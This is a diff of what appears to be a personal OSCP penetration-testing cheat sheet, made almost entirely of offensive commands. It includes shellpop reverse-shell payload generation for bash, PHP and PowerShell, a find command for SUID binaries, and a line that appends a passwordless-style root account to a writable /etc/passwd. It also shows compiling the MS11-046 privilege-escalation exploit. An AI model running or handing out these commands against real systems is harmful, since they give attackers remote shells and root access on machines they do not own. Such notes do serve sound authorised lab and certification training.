@@ -37,6 +37,10 @@ shellpop --payload linux/reverse/tcp/bash --host tap0 --port 443 --base64
 shellpop --payload linux/reverse/tcp/php --host tap0 --port 443     
 shellpop --payload windows/reverse/tcp/powershell --host tap0 --port 443 --base64      
 
+### Find all SUID
+find / -perm -u=s -type f 2>/dev/null
+
+
 #### /etc/passwd writeable
 echo 'slow:aaKNIEDOaueR6:0:0:slow:/root:/bin/bash' >> /etc/passwd   
 su slow   
@@ -55,3 +59,6 @@ i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
 #### TMUX 
 tmux new-session -d -s alice s    
 tmux send-keys -t alice "AR 10.11.1.x -o /git/oscp/labs"
+
+
+
